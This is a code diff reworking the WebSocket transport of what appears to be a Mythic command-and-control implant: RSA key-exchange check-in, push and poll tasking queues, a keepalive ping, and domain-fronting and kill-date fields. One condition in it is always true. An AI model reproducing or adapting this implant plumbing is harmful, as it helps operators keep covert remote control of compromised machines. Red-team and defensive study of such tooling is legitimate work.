@@ -33,8 +33,6 @@ namespace WebsocketTransport
         private string TaskingType;
         private string KillDate;
         private string DomainFront;
-        // synthesis of ProxyHost and ProxyPort
-        private string ProxyAddress;
         private Dictionary<string, string> _additionalHeaders = new Dictionary<string, string>();
         private bool _uuidNegotiated = false;
         private bool _keyExchanged = false;
@@ -42,6 +40,7 @@ namespace WebsocketTransport
         private static ConcurrentQueue<byte[]> senderQueue = new ConcurrentQueue<byte[]>();
         private ST.Task agentConsumerTask = null;
         private ST.Task agentProcessorTask = null;
+        private ST.Task agentPingTask = null;
         private static JsonSerializer jsonSerializer = new JsonSerializer();
         private static AutoResetEvent senderEvent = new AutoResetEvent(false);
         private static ConcurrentQueue<IMythicMessage> receiverQueue = new ConcurrentQueue<IMythicMessage>();
@@ -103,7 +102,10 @@ namespace WebsocketTransport
                     senderEvent.WaitOne();
                     if (senderQueue.TryDequeue(out byte[] result))
                     {
-                        Client.Send(result);
+                        if (Client.IsAlive)
+                        {
+                            Client.Send(result);
+                        }
                     }
                 }
             };
@@ -122,7 +124,17 @@ namespace WebsocketTransport
                 }
             });
 
+            agentPingTask = new ST.Task(() =>
+            {
+                while (Client.IsAlive)
+                {
+                    Client.Ping();
+                    Thread.Sleep(1000);
+                }
+            });
+
             agentProcessorTask.Start();
+            agentPingTask.Start();
 
             while (Agent.IsAlive())
             {
@@ -138,7 +150,7 @@ namespace WebsocketTransport
         {
             agentConsumerTask = new ST.Task(() =>
             {
-                while (Agent.IsAlive())
+                while (Client.IsAlive)
                 {
                     if (!Agent.GetTaskManager().CreateTaskingMessage(delegate (TaskingMessage tm)
                     {
@@ -154,9 +166,19 @@ namespace WebsocketTransport
                     }
                 }
             });
+
+            agentPingTask = new ST.Task(() =>
+            {
+                while (Client.IsAlive)
+                {
+                    Client.Ping();
+                    Thread.Sleep(1000);
+                }
+            });
+
             agentProcessorTask = new ST.Task(() =>
             {
-                while (Agent.IsAlive())
+                while (Client.IsAlive)
                 {
                     Recv(MessageType.MessageResponse, delegate (IMythicMessage msg)
                     {
@@ -166,8 +188,8 @@ namespace WebsocketTransport
             });
             agentConsumerTask.Start();
             agentProcessorTask.Start();
-            agentProcessorTask.Wait();
-            agentConsumerTask.Wait();
+            agentPingTask.Start();
+            agentPingTask.Wait();
         }
 
         public void Start()
@@ -175,7 +197,8 @@ namespace WebsocketTransport
             if (TaskingType == "Poll")
             {
                 Poll();
-            } else if (TaskingType == "Push")
+            }
+            else if (TaskingType == "Push")
             {
                 Push();
             }
@@ -203,7 +226,7 @@ namespace WebsocketTransport
                     receiverQueue = new ConcurrentQueue<IMythicMessage>(receiverQueue.Where(m => m != msg));
                     return onResp(msg);
                 }
-                if (!Connected)
+                if (!Client.IsAlive)
                     break;
             }
             return true;
@@ -227,74 +250,81 @@ namespace WebsocketTransport
 
         public bool Connect(CheckinMessage checkinMsg, OnResponse<MessageResponse> onResp)
         {
-            if (Client == null)
+            Client = new WebSocket(Endpoint + PostUri);
+            Client.WaitTime = TimeSpan.FromHours(8);
+
+            if (TaskingType == "Push")
             {
-                Client = new WebSocket(Endpoint + PostUri);
-
-                if (TaskingType == "Push")
+                Client.CustomHeaders = new List<KeyValuePair<string, string>>
                 {
-                    Client.CustomHeaders = new List<KeyValuePair<string, string>>
-                    {
-                        new KeyValuePair<string, string>("Accept-Type", "Push")
-                    };
-                }
-                
-                //TODO TEST
-                // Use Default Proxy and Cached Credentials for Internet Access
-
-                IWebProxy wr = WebRequest.GetSystemWebProxy();
-                wr.Credentials = CredentialCache.DefaultCredentials;
-                //Client.Proxy = wr;
-                
-                Client.ConnectAsync();
-                Client.OnOpen += OnAsyncConnect;
-                Client.OnMessage += OnAsyncMessageReceived;
-                Client.OnClose += OnAsyncDisconnect;
-            }
-
-            if (EncryptedExchangeCheck && !_uuidNegotiated)
-            {
-                EKEHandshakeMessage handshake1 = new EKEHandshakeMessage()
-                {
-                    Action = "staging_rsa",
-                    PublicKey = this.rsa.ExportPublicKey(),
-                    SessionID = this.rsa.SessionId
+                    new KeyValuePair<string, string>("Accept-Type", "Push")
                 };
-                AddToSenderQueue(handshake1);
-
-                if (!Recv(MessageType.EKEHandshakeResponse, delegate (IMythicMessage resp)
-                {
-                    EKEHandshakeResponse respHandshake = (EKEHandshakeResponse)resp;
-                    byte[] tmpKey = rsa.RSA.Decrypt(Convert.FromBase64String(respHandshake.SessionKey), true);
-                    ((ICryptographySerializer)Serializer).UpdateKey(Convert.ToBase64String(tmpKey));
-                    ((ICryptographySerializer)Serializer).UpdateUUID(respHandshake.UUID);
-                    _keyExchanged = true;
-                    return true;
-                }))
-                {
-                    return false;
-                }
             }
 
-            AddToSenderQueue(checkinMsg);
-            if (agentProcessorTask == null || agentProcessorTask.IsCompleted)
+            //TODO TEST
+            // Use Default Proxy and Cached Credentials for Internet Access
+
+            IWebProxy wr = WebRequest.GetSystemWebProxy();
+            wr.Credentials = CredentialCache.DefaultCredentials;
+            //Client.Proxy = wr;
+            //Client.SetProxy("http://localhost:8080", "", "");
+
+            Client.OnOpen += OnAsyncConnect;
+            Client.OnMessage += OnAsyncMessageReceived;
+            Client.OnClose += OnAsyncDisconnect;
+
+            Client.Connect();
+
+            if (Client.IsAlive)
             {
-                return Recv(MessageType.MessageResponse, delegate (IMythicMessage resp)
+                if (EncryptedExchangeCheck && !_uuidNegotiated)
                 {
-                    MessageResponse mResp = (MessageResponse)resp;
-                    if (!_uuidNegotiated)
+                    EKEHandshakeMessage handshake1 = new EKEHandshakeMessage()
                     {
-                        _uuidNegotiated = true;
-                        ((ICryptographySerializer)Serializer).UpdateUUID(mResp.ID);
-                        checkinMsg.UUID = mResp.ID;
+                        Action = "staging_rsa",
+                        PublicKey = this.rsa.ExportPublicKey(),
+                        SessionID = this.rsa.SessionId
+                    };
+                    AddToSenderQueue(handshake1);
+
+                    if (!Recv(MessageType.EKEHandshakeResponse, delegate (IMythicMessage resp)
+                    {
+                        EKEHandshakeResponse respHandshake = (EKEHandshakeResponse)resp;
+                        byte[] tmpKey = rsa.RSA.Decrypt(Convert.FromBase64String(respHandshake.SessionKey), true);
+                        ((ICryptographySerializer)Serializer).UpdateKey(Convert.ToBase64String(tmpKey));
+                        ((ICryptographySerializer)Serializer).UpdateUUID(respHandshake.UUID);
+                        _keyExchanged = true;
+                        return true;
+                    }))
+                    {
+                        return false;
                     }
-                    Connected = true;
-                    return onResp(mResp);
-                });
+                }
+
+                AddToSenderQueue(checkinMsg);
+                if ((agentProcessorTask == null || agentProcessorTask.IsCompleted) || !agentProcessorTask.IsCompleted)
+                {
+                    return Recv(MessageType.MessageResponse, delegate (IMythicMessage resp)
+                    {
+                        MessageResponse mResp = (MessageResponse)resp;
+                        if (!_uuidNegotiated)
+                        {
+                            _uuidNegotiated = true;
+                            ((ICryptographySerializer)Serializer).UpdateUUID(mResp.ID);
+                            checkinMsg.UUID = mResp.ID;
+                        }
+                        Connected = true;
+                        return onResp(mResp);
+                    });
+                }
+                else
+                {
+                    return true;
+                }
             }
             else
             {
-                return true;
+                return false;
             }
         }
 
@@ -313,7 +343,6 @@ namespace WebsocketTransport
             else
             {
                 m.data = Serializer.Serialize(msg);
-                //m.data = Convert.ToBase64String(Encoding.UTF8.GetBytes(Uuid + jsonSerializer.Serialize(msg)));
             }
             string message = jsonSerializer.Serialize(m);
             senderQueue.Enqueue(Encoding.UTF8.GetBytes(message));
@@ -324,7 +353,7 @@ namespace WebsocketTransport
 
         private void OnAsyncDisconnect(object sender, CloseEventArgs args)
         {
-            // No action needed
+            // No actions
         }
 
         private void OnAsyncMessageReceived(object sender, MessageEventArgs args)
@@ -353,12 +382,6 @@ namespace WebsocketTransport
 
         private void OnAsyncConnect(object sender, EventArgs args)
         {
-            if (writerTasks.Count > 0)
-            {
-                Client.Close();
-                return;
-            }
-
             ST.Task tmp = new ST.Task(sendAction);
             writerTasks[Client] = tmp;
             writerTasks[Client].Start();
